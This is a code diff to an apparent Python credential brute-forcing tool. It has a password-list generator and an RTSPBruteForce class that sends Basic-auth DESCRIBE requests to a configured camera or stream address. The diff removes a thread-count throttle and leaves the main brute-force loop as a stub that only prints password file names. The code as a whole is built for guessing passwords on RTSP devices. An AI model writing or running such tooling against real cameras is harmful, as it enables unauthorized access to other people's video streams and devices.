@@ -19,10 +19,7 @@ class PasswordGenerator:
 
     def password_gen_orch(self):
         threads = []
-
         for i in range(self.config.length['start'], self.config.length['end'] + 1):
-            while len(threads) >= self.config.pass_gen_threads:
-                time.sleep(10)
             t = threading.Thread(target=self.worker, args=(i,))
             threads.append(t)
             t.start()
@@ -42,7 +39,7 @@ class PasswordGenerator:
         print(f"Done {i}")
 
     def save_passwords_file(self, bulker, config, i):
-        output_file = Path(os.path.join(config.filepath, f'passwords_{i}.txt'))
+        output_file = Path(os.path.join(config.passwords_dir, f'passwords_{i}.txt'))
         output_file.parent.mkdir(exist_ok=True, parents=True)
         with open(output_file, 'a') as f:
             for s in bulker:
@@ -50,8 +47,8 @@ class PasswordGenerator:
 
 
 class RTSPBruteForce:
-    def __init__(self, config):
-        self.config = config
+    def __init__(self):
+        self.config = Config()
         self.characters = self.config.characters
         self.digits = self.config.digits
         self.symbols = self.config.symbols
@@ -73,7 +70,20 @@ class RTSPBruteForce:
         base64_bytes = base64.b64encode(credentials_bytes)
         return base64_bytes
 
+    def get_pass_files(self):
+        passwords = os.listdir(self.config.passwords_dir)
+        return passwords
+
+
     def brute_force_rtsp(self):
+        files = self.get_pass_files()
+        for file in files:
+            print(file)
+            pass
+
+
+
+    def create_conn(self):
         try:
             b64 = self.base64encode()
             dest = f"DESCRIBE rtsp://{self.config.rtsp_ip}:{self.config.rtsp_port}/unicast RTSP/1.0\r\nCSeq: 2\r\nAuthorization: Basic {b64}\r\n\r\n"
